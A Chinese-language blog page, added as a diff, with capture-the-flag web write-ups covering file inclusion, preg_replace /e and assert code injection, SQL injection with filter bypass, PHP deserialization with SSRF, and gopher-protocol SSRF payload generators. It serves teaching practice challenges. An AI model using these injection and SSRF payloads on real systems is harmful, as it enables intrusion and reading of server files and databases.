@@ -1,0 +1,731 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/avatat.png">
+  <link rel="icon" href="/img/avatar.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Zheng Yi">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="ics-5这个题目一开始进去瞎点没有什么思路，发现只有云平台设备维修中心可以点一点，可以发现url在变换，我们于是尝试一下文件包含漏洞 文件包含由此可以判断有文件包含漏洞“ 接下来我们尝试读取源码使用php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;index.php这里是base64编码的">
+<meta property="og:type" content="article">
+<meta property="og:title" content="综合">
+<meta property="og:url" content="http://example.com/2023/05/29/%E7%BB%BC%E5%90%88/index.html">
+<meta property="og:site_name" content="ZizZy&#39;s blog">
+<meta property="og:description" content="ics-5这个题目一开始进去瞎点没有什么思路，发现只有云平台设备维修中心可以点一点，可以发现url在变换，我们于是尝试一下文件包含漏洞 文件包含由此可以判断有文件包含漏洞“ 接下来我们尝试读取源码使用php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;index.php这里是base64编码的">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/img/%E7%BB%BC%E5%90%881.png">
+<meta property="og:image" content="http://example.com/img/%E7%BB%BC%E5%90%882.png">
+<meta property="og:image" content="http://example.com/img/%E7%BB%BC%E5%90%883.png">
+<meta property="og:image" content="http://example.com/img/%E7%BB%BC%E5%90%884.png">
+<meta property="og:image" content="http://example.com/img/%E7%BB%BC%E5%90%885.png">
+<meta property="og:image" content="http://example.com/img/%E7%BB%BC%E5%90%886.png">
+<meta property="og:image" content="http://example.com/img/%E7%BB%BC%E5%90%887.png">
+<meta property="og:image" content="http://example.com/img/%E7%BB%BC%E5%90%888.png">
+<meta property="article:published_time" content="2023-05-29T03:07:07.000Z">
+<meta property="article:modified_time" content="2023-06-02T09:06:01.155Z">
+<meta property="article:author" content="Zheng Yi">
+<meta property="article:tag" content="ctf">
+<meta property="article:tag" content="文件包含">
+<meta property="article:tag" content="代码执行">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/img/%E7%BB%BC%E5%90%881.png">
+  
+  
+  
+  <title>综合 - ZizZy&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":true,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Fluid</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/tiger.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="综合"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-05-29 11:07" pubdate>
+          2023年5月29日 上午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          6.9k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          58 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">综合</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h2 id="ics-5"><a href="#ics-5" class="headerlink" title="ics-5"></a>ics-5</h2><p>这个题目一开始进去瞎点没有什么思路，发现只有云平台设备维修中心可以点一点，可以发现url在变换，我们于是尝试一下文件包含漏洞</p>
+<h3 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h3><p><img src="/img/%E7%BB%BC%E5%90%881.png" srcset="/img/loading.gif" lazyload><br>由此可以判断有文件包含漏洞“</p>
+<p>接下来我们尝试读取源码使用php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;index.php<br><img src="/img/%E7%BB%BC%E5%90%882.png" srcset="/img/loading.gif" lazyload><br>这里是base64编码的我们对其解码</p>
+<h3 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>] === <span class="hljs-string">&#x27;127.0.0.1&#x27;</span>) &#123;<br><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br &gt;Welcome My Admin ! &lt;br &gt;&quot;</span>;<br><br>    <span class="hljs-variable">$pattern</span> = <span class="hljs-variable">$_GET</span>[pat];<br>    <span class="hljs-variable">$replacement</span> = <span class="hljs-variable">$_GET</span>[rep];<br>    <span class="hljs-variable">$subject</span> = <span class="hljs-variable">$_GET</span>[sub];<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$pattern</span>) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$replacement</span>) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$subject</span>)) &#123;<br>        <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-variable">$pattern</span>, <span class="hljs-variable">$replacement</span>, <span class="hljs-variable">$subject</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>();<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>这里我们开始进行简单的代码审计，可以发现这里会对我们的源IP进行检验如果是127.0.0.1就会输出对应的内容，接下来我们进行尝试<br><img src="/img/%E7%BB%BC%E5%90%883.png" srcset="/img/loading.gif" lazyload><br>查看下面的代码发现preg_replace函数</p>
+<h4 id="preg-replace代码执行漏洞（-x2F-e）"><a href="#preg-replace代码执行漏洞（-x2F-e）" class="headerlink" title="preg_replace代码执行漏洞（&#x2F;e）"></a>preg_replace代码执行漏洞（&#x2F;e）</h4><p>这里有GET型传参，三个变量为pat,rep,sub<br>pat(pattern)：要搜索的模式，可以是字符串或一个字符串数组<br>rep(replacement):用于替换的字符串或者字符串数字<br>sub(subject):要搜索的替换的目标字符串或字符串数组</p>
+<p>这里使用命令<br>pat&#x3D;&#x2F;abc&#x2F;e&amp;rep&#x3D;system(‘ls’)&amp;sub&#x3D;abcde<br><img src="/img/%E7%BB%BC%E5%90%884.png" srcset="/img/loading.gif" lazyload><br>可以查看当前目录<br>继续构造payload<br>pat&#x3D;&#x2F;abc&#x2F;e&amp;rep&#x3D;system(‘cd s3chahahaDir&amp;&amp;ls’)&amp;sub&#x3D;abcde<br>url编码后<br>pat&#x3D;&#x2F;abc&#x2F;e&amp;rep&#x3D;system(‘cd%20s3chahahaDir%26%26ls’)&amp;sub&#x3D;abcde<br>存在flag</p>
+<h2 id="mfw"><a href="#mfw" class="headerlink" title="mfw"></a>mfw</h2><p>通过点击各个页面可以发现一点蛛丝马迹，文中说到使用git，这里就应该想到使用git源码泄露</p>
+<h3 id="githacker"><a href="#githacker" class="headerlink" title="githacker"></a>githacker</h3><p>在kali里面进行安装<br>可以探测git源码是否泄露<br> python3 githacker.py –url <a target="_blank" rel="noopener" href="http://111.200.241.244:56610/">http://111.200.241.244:56610/</a> –folder result</p>
+<p>可以发现下载的index.php文件<br>打开可以发现源码</p>
+<h3 id="代码审计-1"><a href="#代码审计-1" class="headerlink" title="代码审计"></a>代码审计</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;page&#x27;</span>])) &#123;<br>        <span class="hljs-variable">$page</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;page&#x27;</span>];<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$page</span> = <span class="hljs-string">&quot;home&quot;</span>;<br>&#125;<br><br><span class="hljs-variable">$file</span> = <span class="hljs-string">&quot;templates/&quot;</span> . <span class="hljs-variable">$page</span> . <span class="hljs-string">&quot;.php&quot;</span>;<br><br><span class="hljs-comment">// I heard &#x27;..&#x27; is dangerous!</span><br><span class="hljs-title function_ invoke__">assert</span>(<span class="hljs-string">&quot;strpos(&#x27;<span class="hljs-subst">$file</span>&#x27;, &#x27;..&#x27;) === false&quot;</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Detected hacking attempt!&quot;</span>);<br><br><span class="hljs-comment">// <span class="hljs-doctag">TODO:</span> Make this look nice</span><br><span class="hljs-title function_ invoke__">assert</span>(<span class="hljs-string">&quot;file_exists(&#x27;<span class="hljs-subst">$file</span>&#x27;)&quot;</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;That file doesn&#x27;t exist!&quot;</span>);<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>我们来看这一段代码<br>猜测flag是不是在templates&#x2F;flag.php下<br>1、我们可以使用assert运行代码<br>2、我们可以通过闭合strpos使得报错<br>3、使用system函数执行外面命令</p>
+<p>但是我们应该如何构造payload的呢，尝试构造payload:<br>?page&#x3D;”)or system(“cat .&#x2F;templates&#x2F;flag.php”);&#x2F;&#x2F;</p>
+<h2 id="Fakebook"><a href="#Fakebook" class="headerlink" title="Fakebook"></a>Fakebook</h2><h3 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h3><h4 id="寻找注入点"><a href="#寻找注入点" class="headerlink" title="寻找注入点"></a>寻找注入点</h4><p>几个按钮点一点发现url上存在?no&#x3D;1这种，我们应该想到SQL注入<br>开始尝试<br>?no&#x3D;1’and 1&#x3D;1#<br>这里发现单引号会一直出错，我们尝试数字型注入<br>?no&#x3D;1 and 1&#x3D;1#<br>?no&#x3D;1 and 1&#x3D;2#<br>一个报错一个不报错，确认存在SQL注入</p>
+<h4 id="判断字段数"><a href="#判断字段数" class="headerlink" title="判断字段数"></a>判断字段数</h4><p>order by 4正常回显<br>order by 5页面错误<br>字段数为4</p>
+<h4 id="开始注入"><a href="#开始注入" class="headerlink" title="开始注入"></a>开始注入</h4><p>联合查询<br><img src="/img/%E7%BB%BC%E5%90%885.png" srcset="/img/loading.gif" lazyload><br>这里我们进行尝试绕过 大小写 双写<br>因为这里显示报错信息，所以应该是通过检测字符进行防御，双写大概率不行<br>最后用++或者&#x2F;&#x2F;符号将union 和select 隔开发现可以绕过<br><img src="/img/%E7%BB%BC%E5%90%886.png" srcset="/img/loading.gif" lazyload><br>发现2是有效回显点，**(这里注意一个路径&#x2F;var&#x2F;www&#x2F;html&#x2F;view.php)**</p>
+<p>通过注入得到<br>库名 fakebook 其他的库 information_schema,mysql,performance_schema,test<br>用户 root@localhost<br>开始查表得到表 users<br>查字段<br><img src="/img/%E7%BB%BC%E5%90%887.png" srcset="/img/loading.gif" lazyload><br>查字段内容 username passwd data<br><img src="/img/%E7%BB%BC%E5%90%888.png" srcset="/img/loading.gif" lazyload><br>MD5解密后发现这个是其实就是注册的密码 后面的反序列化内容也是注册的信息</p>
+<h3 id="代码审计-2"><a href="#代码审计-2" class="headerlink" title="代码审计"></a>代码审计</h3><p>参考其他web可以发现robots.txt下面有东西<br>源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UserInfo</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span> = <span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$age</span> = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$blog</span> = <span class="hljs-string">&quot;&quot;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$age</span>, <span class="hljs-variable">$blog</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;name = <span class="hljs-variable">$name</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;age = (<span class="hljs-keyword">int</span>)<span class="hljs-variable">$age</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;blog = <span class="hljs-variable">$blog</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get</span>(<span class="hljs-params"><span class="hljs-variable">$url</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$ch</span> = <span class="hljs-title function_ invoke__">curl_init</span>();<br><br>        <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_URL, <span class="hljs-variable">$url</span>);<br>        <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);<br>        <span class="hljs-variable">$output</span> = <span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$ch</span>);<br>        <span class="hljs-variable">$httpCode</span> = <span class="hljs-title function_ invoke__">curl_getinfo</span>(<span class="hljs-variable">$ch</span>, CURLINFO_HTTP_CODE);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$httpCode</span> == <span class="hljs-number">404</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">404</span>;<br>        &#125;<br>        <span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$ch</span>);<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$output</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getBlogContents</span> (<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-variable">$this</span>-&gt;blog);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">isValidBlog</span> (<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$blog</span> = <span class="hljs-variable language_">$this</span>-&gt;blog;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i&quot;</span>, <span class="hljs-variable">$blog</span>);<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>代码审计发现curl函数这里应该想到请求伪造，我们搜索data里面的返回是序列化，所以我们猜测内容需要进行一次反序列化输出，所以构造反序列化内容，由于存在curl函数，所以应该想到请求伪造，SSRF又可以使用file等协议，所以我们直接构造payload</p>
+<h3 id="反序列化-SSRF"><a href="#反序列化-SSRF" class="headerlink" title="反序列化+SSRF"></a>反序列化+SSRF</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UserInfo</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span> = <span class="hljs-string">&quot;1&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$age</span> = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$blog</span> = <span class="hljs-string">&quot;file:///var/www/html/flag.php&quot;</span>;<br><br><br>&#125;<br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">UserInfo</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br></code></pre></td></tr></table></figure>
+
+<p>将序列化后的结果放到板块四中，查看源码即可发现flag</p>
+<h2 id="very-easy-sql"><a href="#very-easy-sql" class="headerlink" title="very_easy_sql"></a><strong>very_easy_sql</strong></h2><p>这个题目到处瞧一瞧看一看就会发现是个SSRF</p>
+<h3 id="Gopher协议"><a href="#Gopher协议" class="headerlink" title="Gopher协议"></a>Gopher协议</h3><p>gopher支持发出GET、POST请求。可以先截获get请求包和post请求包，再构造成符合gopher协议的请求,gopher协议是<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=ssrf&spm=1001.2101.3001.7020">ssrf</a>利用中一个最强大的协议(俗称万能协议)</p>
+<h4 id="gopher协议数据格式："><a href="#gopher协议数据格式：" class="headerlink" title="gopher协议数据格式："></a>gopher协议数据格式：</h4><p>gopher:&#x2F;&#x2F;ip:port&#x2F;_TCP&#x2F;IP数据流<br><strong>注意</strong></p>
+<ul>
+<li>gopher协议数据流中，url编码使用%0d%0a替换字符串中的回车换行</li>
+<li>数据流末尾使用%0d%0a代表消息结束</li>
+</ul>
+<h4 id="POST请求"><a href="#POST请求" class="headerlink" title="POST请求"></a>POST请求</h4><p>构造gopher的post请求需要知道有四个参数是必须的，</p>
+<ol>
+<li>目标URL：即请求的目标地址。</li>
+<li>请求头：包含请求的元数据，如Content-Type、Content-Length等。</li>
+<li>请求体：包含请求的具体数据内容，可以是表单数据、JSON数据、XML数据等。</li>
+</ol>
+<p>其中，目标URL和请求头是必须的，而请求体则根据实际情况而定。如果请求不需要传递数据，则请求体可以为空。</p>
+<h4 id="python编写Gopher协议的payload"><a href="#python编写Gopher协议的payload" class="headerlink" title="python编写Gopher协议的payload"></a>python编写Gopher协议的payload</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> urllib.parse<br><br>host = <span class="hljs-string">&quot;127.0.0.1:80&quot;</span><br>content = <span class="hljs-string">&quot;uname=admin&amp;passwd=admin&quot;</span><br>content_length = <span class="hljs-built_in">len</span>(content)<br><br>test =\<br><span class="hljs-string">&quot;&quot;&quot;POST /index.php HTTP/1.1</span><br><span class="hljs-string">Host: &#123;&#125;</span><br><span class="hljs-string">Content-Type: application/x-www-form-urlencoded</span><br><span class="hljs-string">Content-Length: &#123;&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">&quot;&quot;&quot;</span>.<span class="hljs-built_in">format</span>(host,content_length,content)<br>//按照标准，URL只允许一部分ASCII字符，其他字符（如汉字）是不符合标准的，此时就要进行编码。<br>因为我在构造URL的过程中要使用到中文：此时需要用到urllib.parse.quote，此处是为了替换特殊字符\<br>tmp = urllib.parse.quote(test) <br>new = tmp.replace(<span class="hljs-string">&quot;%0A&quot;</span>,<span class="hljs-string">&quot;%0D%0A&quot;</span>)<br>result = urllib.parse.quote(new) <br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;gopher://&quot;</span>+host+<span class="hljs-string">&quot;/_&quot;</span>+result)<br><br></code></pre></td></tr></table></figure>
+
+<p>突然很容器出现问题</p>
+<p>只能按着别人题解写了</p>
+<p>我们在返回包里面可以看到一个cookie，base64()解密后发现是admin<br>我们构造payload admin’#发现会报错接下来就是使用报错注入了，进行爆库，表字段<br>下面是payload</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> urllib.parse<br><span class="hljs-keyword">import</span> base64<br>host = <span class="hljs-string">&quot;127.0.0.1:80&quot;</span><br>payload = <span class="hljs-string">&quot;admin&#x27;) and extractvalue(1, concat(0x7e, (select database()),0x7e)) #&quot;</span><br>base64_payload = <span class="hljs-built_in">str</span>(base64.b64encode(payload.encode(<span class="hljs-string">&quot;utf-8&quot;</span>)), <span class="hljs-string">&quot;utf-8&quot;</span>)<br>cookie=<span class="hljs-string">&quot;this_is_your_cookie=&quot;</span>+base64_payload<br><br>test =\<br><span class="hljs-string">&quot;&quot;&quot;GET /index.php HTTP/1.1</span><br><span class="hljs-string">Host: &#123;&#125;</span><br><span class="hljs-string">Connection: close</span><br><span class="hljs-string">Content-Type: application/x-www-form-urlencoded</span><br><span class="hljs-string">Cookie:&#123;&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">&quot;&quot;&quot;</span>.<span class="hljs-built_in">format</span>(host,cookie)<br><br>tmp = urllib.parse.quote(test)<br>new = tmp.replace(<span class="hljs-string">&quot;%0A&quot;</span>,<span class="hljs-string">&quot;%0D%0A&quot;</span>)<br>result = urllib.parse.quote(new)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;gopher://&quot;</span>+host+<span class="hljs-string">&quot;/_&quot;</span>+result)<br><br></code></pre></td></tr></table></figure>
+
